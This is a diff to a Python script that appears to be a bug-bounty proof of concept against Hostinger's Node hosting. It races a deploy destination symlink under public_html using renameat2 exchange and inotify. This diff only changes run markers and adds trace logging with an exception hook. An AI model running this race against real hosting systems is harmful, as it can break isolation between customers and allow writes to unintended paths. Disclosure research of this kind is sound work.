@@ -10,6 +10,7 @@ import os
 from pathlib import Path
 import stat
 import struct
+import sys
 import time
 
 
@@ -18,16 +19,16 @@ AT_FDCWD = -100
 RENAME_EXCHANGE = 2
 IN_CREATE = 0x00000100
 IN_MOVED_TO = 0x00000080
-MARKER = b"HOSTINGER_NODE_DESTLINK_RUNTIME_RACE:r254p"
-NAME = "h1-destlink-race-r254p"
-NONCE = "bugbounty-DESTLINK-RACE-20261126-r254p-73d14c6e"
+MARKER = b"HOSTINGER_NODE_DESTLINK_RUNTIME_RACE:r254q"
+NAME = "h1-destlink-race-r254q"
+NONCE = "bugbounty-DESTLINK-RACE-20261126-r254q-15e7b0ac"
 libc = ctypes.CDLL(None, use_errno=True)
 vhost = Path.cwd().resolve().parents[2]
 public = vhost / "public_html"
 destination = public / NAME
-alternate = public / ".h1-destlink-race-swap-r254p"
-sibling = vhost / "h1-destlink-race-target-r254p"
-trace_path = Path.home() / ".h1-r254p-dest-race-trace.json"
+alternate = public / ".h1-destlink-race-swap-r254q"
+sibling = vhost / "h1-destlink-race-target-r254q"
+trace_path = Path.home() / ".h1-r254q-dest-race-trace.json"
 logs_root = vhost / "hbuilds" / "logs"
 started = time.monotonic()
 deadline = started + 30.0
@@ -38,6 +39,25 @@ trace: dict[str, object] = {
     "event": "not-observed",
     "targetModeDuringSync": 0,
 }
+
+
+def write_trace() -> None:
+    trace_path.write_text(json.dumps(trace, sort_keys=True) + "\n")
+    trace_path.chmod(0o600)
+
+
+def uncaught(error_type, error, traceback) -> None:
+    trace["uncaughtError"] = error_type.__name__
+    trace["uncaughtMessage"] = str(error)[:240]
+    trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
+    try:
+        write_trace()
+    finally:
+        sys.__excepthook__(error_type, error, traceback)
+
+
+sys.excepthook = uncaught
+write_trace()
 
 
 def exchange(first: Path, second: Path) -> int:
@@ -178,7 +198,6 @@ trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
 if inotify_fd >= 0:
     os.close(inotify_fd)
 try:
-    trace_path.write_text(json.dumps(trace, sort_keys=True) + "\n")
-    trace_path.chmod(0o600)
+    write_trace()
 except OSError:
     pass
